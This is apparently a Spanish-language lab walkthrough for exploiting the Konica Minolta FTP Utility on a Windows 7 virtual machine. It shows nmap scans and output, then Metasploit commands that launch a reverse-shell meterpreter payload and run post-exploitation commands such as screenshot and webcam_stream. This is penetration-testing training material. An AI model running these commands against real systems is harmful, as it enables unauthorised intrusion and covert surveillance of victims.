# Explotación de Vulnerabilidad en Konica Minolta FTP Utility

TARGET: 192.168.153.181 (WINDOWS con KONIKA)

##  Enumeración de servicios

Disponemos de un servicio FTP que tiene KONICA, ejecutemos un NMAP

![image](https://user-images.githubusercontent.com/50930193/170808832-22fb84b1-adf6-4e99-8ab4-84a553b3dc7e.png)

# Explotación de Vulnerabilidad Konika

TARGET: 192.168.153.180 (Konica Minolta)

##  Enumeración de servicios

Ejecutamos nmap
```
nmap -A -p- -T4 -oX win.txt 192.168.153.180
```
Estos son los resultados

```
PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            Konica Minolta FTP Utility ftpd 1.00
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx   1 Elliot   Elliot            402 Jan 18  2020 desktop.ini [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ          545 Apr 15  2020 dll.h [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ          635 Apr 15  2020 dllmain.cpp [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ         1280 Apr 15  2020 Makefile.win [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Music [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Pictures [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Videos [NSE: writeable]
|_-rwxrwxrwx   1 Administ Administ          801 Apr 15  2020 test.dev [NSE: writeable]
|_ftp-bounce: bounce working!
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-M2PPJKIFLHN
| Not valid before: 2021-05-16T00:14:42
|_Not valid after:  2021-11-15T00:14:42
|_ssl-date: 2021-06-08T20:42:37+00:00; -1s from scanner time.
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
10243/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49156/tcp open  msrpc          Microsoft Windows RPC
49157/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 00:0C:29:03:C0:7A (VMware)
Service Info: Host: WIN-M2PPJKIFLHN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h22m30s, deviation: 2h44m59s, median: -1s
|_nbstat: NetBIOS name: WIN-M2PPJKIFLHN, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:03:c0:7a (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-M2PPJKIFLHN
|   NetBIOS computer name: WIN-M2PPJKIFLHN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-09T02:11:34+05:30
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-08T20:41:34
|_  start_date: 2021-06-08T18:59:24
[*] Execution time in seconds:
	 TTL: 0
	 Furious: 36
	 Nmap: 184
	 Total: 220

```

## Detectar software vulnerable

Ahora concentremonos en solo el puerto 445

```
nmap -sV -p21 --script 'default,vuln' -oA 192.168.153.180_vuln 192.168.153.180
```
Los resultados son los siguientes
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 16:44 EDT
Nmap scan report for 192.168.153.180
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Konica Minolta FTP Utility ftpd 1.00
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx   1 Elliot   Elliot            402 Jan 18  2020 desktop.ini [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ          545 Apr 15  2020 dll.h [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ          635 Apr 15  2020 dllmain.cpp [NSE: writeable]
| -rwxrwxrwx   1 Administ Administ         1280 Apr 15  2020 Makefile.win [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Music [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Pictures [NSE: writeable]
| drwxrwxrwx   1 SYSTEM   SYSTEM              0 Jan 18  2020 My Videos [NSE: writeable]
|_-rwxrwxrwx   1 Administ Administ          801 Apr 15  2020 test.dev [NSE: writeable]
|_ftp-bounce: bounce working!
|_sslv2-drown: 
MAC Address: 00:0C:29:03:C0:7A (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.24 seconds

```

Esta vulnerabilidad explota la vulnerabilidad del Software Konica Minolta que operaba bajo el puerto 21. En los resultados vemos que se pueden ubicar usuarios anonimos

Asimismo, en la máquina con Konica se puede ver con TCPView los puertos Abiertos

![image](https://user-images.githubusercontent.com/50930193/121270492-75f40a80-c887-11eb-945e-81134c4de12b.png)

## 1. Detección de Vulnerabilidad con Metasploit

Ingresa a metasploit
```
msfconsole -q
```
El primer paso es ubicar un módulo que permita validar si el servicio es vulnerable
```
search konica
```
![image](https://user-images.githubusercontent.com/50930193/121254556-045c9200-c870-11eb-9152-054610599a31.png)

Usemos ese exploit marcado
```
use exploit/windows/ftp/kmftp_utility_cwd
```
Tambien podemos usar con el #
```
use 1
```

![image](https://user-images.githubusercontent.com/50930193/121109445-35d25080-c7d1-11eb-9255-30e17f289f53.png)

Seteamos el payload
```
set payload windows/meterpreter/reverse_tcp
```
![image](https://user-images.githubusercontent.com/50930193/121109524-5c908700-c7d1-11eb-8358-7d8ea4a1b830.png)

Revise que parámetros son necesarios incluir en este payload
```
show options
```
![image](https://user-images.githubusercontent.com/50930193/121109809-dd4f8300-c7d1-11eb-9c28-a748cef416cd.png)


Considere los parámetros no opcionales, si no encontrara los parametros llenos seteelos de la siguiente manera:

```
set RHOSTS  192.168.153.180
set LHOST 192.168.153.178

```
![image](https://user-images.githubusercontent.com/50930193/121254741-3c63d500-c870-11eb-9bfc-6b0eb1ee1fcf.png)

Ahora que tiene todos los parametros llenos, lance el exploit
```
exploit

```



En este caso levanta el meterpreter y pueden ejecutar diversos comandos
```
meterpreter > help
meterpreter > ls
meterpreter > pwd
meterpreter > screenshot
meterpreter > webcam_list
meterpreter > shell
```

Otros comandos desde msf
```
sessions -v
```
![image](https://user-images.githubusercontent.com/50930193/170809241-3e8f7a4a-9415-4b7a-bc12-75f85fbc01f9.png)

```
sessions -C screenshot -i 1,2
```
![image](https://user-images.githubusercontent.com/50930193/170809319-8338a599-5a16-4b72-9508-49bf1e1542d9.png)


##  Proceso de Explotación (Resumen)

Digite desde el terminal de kali

```
msfconsole -q
use exploit/windows/ftp/kmftp_utility_cwd
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.109.128 (IP of Local Host)
set rhost 192.168.109.131
set FTPUSER anonymous
exploit
```

Desde meterpreter pueden ejecuitar lo siguiente:
```
screenshot
webcam_list
webcam_stream
getuid
sysinfo
```
